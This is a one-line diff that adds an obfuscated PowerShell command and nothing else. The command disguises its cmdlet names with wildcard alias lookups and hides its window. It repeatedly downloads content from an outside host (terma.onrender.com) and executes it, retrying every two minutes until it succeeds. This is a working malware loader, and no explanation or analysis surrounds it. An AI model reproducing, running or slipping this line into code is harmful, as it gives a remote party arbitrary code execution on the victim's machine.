@@ -1,0 +1,1 @@
+Microsoft /w 1 /nOp dO{$error.clear();tRy{$e=(.(`ga`l ?rm)terma.onrender.com/0)}caTCh{.(`ga`l ?lee?)120}fInalLy{.(`ga`l ?e[?x])$e}}unTiL(-not$error)
